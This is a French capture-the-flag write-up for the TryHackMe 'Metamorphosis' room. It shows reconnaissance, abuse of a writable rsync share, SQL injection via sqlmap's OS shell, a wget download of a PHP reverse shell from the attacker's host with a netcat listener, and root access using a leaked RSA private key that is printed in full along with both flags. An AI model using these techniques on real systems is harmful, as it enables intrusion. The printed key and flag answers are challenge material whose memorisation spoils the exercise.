# Metamorphosis #   

## Task 1 Challenge ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.33.218 metamorphosis.thm' >> /etc/hosts" 
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A metamorphosis.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 12:48 CET
Nmap scan report for metamorphosis.thm (10.10.33.218)
Host is up (0.033s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       (protocol version 31)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/31%OT=22%CT=1%CU=30355%PV=Y%DS=2%DC=T%G=Y%TM=617E82
OS:D0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST
OS:11NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-10-31T11:49:34+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-31T11:49:34
|_  start_date: N/A

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   32.11 ms 10.9.0.1
2   32.46 ms metamorphosis.thm (10.10.33.218)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.76 seconds

```

Nmap nous montre les services suivants : 
Le service SSH sur le port 22.   
Le service HTTP sur le port 80.   
Le service Samba sur les ports 139 et 445.   
Le service rsync sur le port 873.  

D'après le titre de site web sur le port 80 on est sur une page par défaut d'apache.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u metamorphosis.thm -w /usr/share/dirb/wordlists/common.txt -t 100 -q 
/admin                (Status: 301) [Size: 322] [--> http://metamorphosis.thm/admin/]
/.hta                 (Status: 403) [Size: 282]                                      
/index.php            (Status: 200) [Size: 10818]                                    
/.htaccess            (Status: 403) [Size: 282]                                      
/.htpasswd            (Status: 403) [Size: 282]                                      
/server-status        (Status: 403) [Size: 282]               
```

On trouve un répertoire /admin.   

![page](./Task1-01.png)   
![page](./Task1-02.png)  

Dans le code source de la page admin on trouve un message comme quoi le page fonctionne dans un environnement de développement.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ smbclient -L metamorphosis.thm
Enter WORKGROUP\tim's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

On trouve rien dans le serveur SMB.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap --script "rsync-list-modules"  metamorphosis.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 13:05 CET
Nmap scan report for metamorphosis.thm (10.10.33.218)
Host is up (0.037s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
873/tcp open  rsync
| rsync-list-modules: 
|_  Conf           	All Confs

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

On voit que l'on lire le répertoire Conf qui contient toutes les configurations.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ rsync -av --list-only rsync://metamorphosis.thm/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 22:03:08 .
-rw-r--r--          4,620 2021/04/09 22:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 21:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 22:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 22:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 22:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 21:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 21:56:56 php.ini
-rw-r--r--            320 2021/04/09 22:03:16 ports.conf
-rw-r--r--            589 2021/04/09 22:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 22:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 22:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 22:03:06 webapp.ini

sent 20 bytes  received 379 bytes  798.00 bytes/sec
total size is 193,430  speedup is 484.79
```

On voit tout les fichiers de configuration.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ mkdir conf
tim@kali:~/Bureau/tryhackme/write-up$ rsync -av rsync://metamorphosis.thm/Conf ./Conf
receiving incremental file list
created directory ./Conf
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

sent 255 bytes  received 194,360 bytes  129,743.33 bytes/sec
total size is 193,430  speedup is 0.99
tim@kali:~/Bureau/tryhackme/write-up$ cd Conf/
tim@kali:~/Bureau/tryhackme/write-up/Conf$ cat webapp.ini 
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No

```

On récupère les fichiers de configuration.   
On remarque un fichier webapp.ini.   
On voit que l'on peut changer la variable env.   

```bash
tim@kali:~/Bureau/tryhackme/write-up/Conf$ sed -i 's/env = prod/env = dev/g' webapp.ini 

tim@kali:~/Bureau/tryhackme/write-up/Conf$ rsync -av webapp.ini rsync://metamorphosis.thm/Conf/webapp.ini
sending incremental file list
webapp.ini

sent 177 bytes  received 41 bytes  145.33 bytes/sec
total size is 71  speedup is 0.33
```

On modifie le prod par env.   
On applique les modifications sur le serveur cible.  

![page](./Task1-03.png) 

On a maintenant une entrée, vérifions sur elle est vulnérable à une injection sql.   

![page](./Task1-04.png) 

On enregistre une requête avec Burp.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sqlmap -r input.req -dbs --level 5 --risk 3 --os-shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.10#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
...
[13:26:33] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://metamorphosis.thm:80/tmpuzyio.php
[13:26:33] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://metamorphosis.thm:80/tmpbijrt.php
[13:26:33] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```

On lance sqlmap avec l'option de mettre un shell en place si il réussie.  

**user.txt**

```bash
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell> ls /home
command standard output: 'tom'
os-shell> ls /home/tom
command standard output: 'user.txt'
os-shell> cat /home/tom/user.txt
command standard output: '4ce794a9d0019c1f684e07556821e0b0'
```

On remraque un utilisateur tom avec dans le répertoire un fichier user.txt.
On lit le fichier user.txt et on trouve le flag qui est : 4ce794a9d0019c1f684e07556821e0b0  

**root.txt**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -nv
2021-10-31 13:36:55 URL:https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211031%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211031T123655Z&X-Amz-Expires=300&X-Amz-Signature=1c36995a088a59ec90d3bfd5ec70b1e3045758d353bf0433127f7febe6e68c56&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [3078592/3078592] -> "pspy64" [1]

tim@kali:~/Bureau/tryhackme/write-up$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

os-shell> wget http://10.9.228.66:8000/pspy64 -nv
command standard output: '2021-10-31 12:40:44 URL:http://10.9.228.66:8000/pspy64 [3078592/3078592] -> "pspy64" [1]'

os-shell> chmod +x pspy64
No output

os-shell> wget http://10.9.228.66:8000/reverseShell.php -nv
command standard output: '2021-10-31 12:48:48 URL:http://10.9.228.66:8000/reverseShell.php [3908/3908] -> "reverseShell.php" [1]'
```

On télécharge sur notre cible pspy et un reverseshell en php.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

On écoute sur le port 1234 pour avoir un shell (suivant le port configuré sur le reverseshell).   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://metamorphosis.thm/reverseShell.php 

tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.33.218.
Ncat: Connection from 10.10.33.218:39316.
Linux incognito 4.15.0-144-generic #148-Ubuntu SMP Sat May 8 02:33:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 12:52:25 up  1:41,  0 users,  load average: 0.00, 0.07, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@incognito:/$ cd /var/www/html/
cd /var/www/html/
www-data@incognito:/var/www/html$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2021/10/31 12:54:57 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2021/10/31 12:56:01 CMD: UID=0    PID=2330   | /usr/sbin/CRON -f 
2021/10/31 12:56:01 CMD: UID=0    PID=2333   | curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12 
2021/10/31 12:56:01 CMD: UID=0    PID=2332   | /bin/sh /root/req.sh 
2021/10/31 12:56:01 CMD: UID=0    PID=2331   | /bin/sh -c /root/req.sh 
```

On exécute le reverse shell.
Une foit le shell obtenu on exécute pspy.  
Pspy nous montre que curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12 est exécuter régulierement.   

```bash
www-data@incognito:/$ curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12
<27.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----
```

L'adresse nous donne une clef privée.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa 
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa root@metamorphosis.thm 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 31 13:06:01 UTC 2021

  System load:  0.31              Processes:           130
  Usage of /:   53.3% of 8.79GB   Users logged in:     0
  Memory usage: 89%               IP address for eth0: 10.10.33.218
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Sat Apr 10 19:40:46 2021
root@incognito:~# cat /root/root.txt
7ffca2ec63534d165525bf37d91b4ff4

```

On copie la clef dans un fichier ici c'est id_rsa.  
On change les droits pour ssh lise la clef. 
On se connecte sur le compte de root et on lit le fichier root.txt dans le répertoire root.   
Le flag est : 7ffca2ec63534d165525bf37d91b4ff4   